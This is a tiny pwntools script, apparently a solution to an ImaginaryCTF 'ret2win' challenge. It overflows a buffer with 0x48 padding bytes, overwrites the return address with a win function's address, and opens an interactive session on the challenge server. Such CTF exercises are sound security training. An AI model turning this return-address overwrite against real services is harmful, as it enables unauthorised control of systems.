from pwn import *

p = remote("ret2win.chal.imaginaryctf.org", 1337)

win = 0x401182

payload = b"a"*0x48 + p64(win)
p.sendline(payload)
p.interactive()
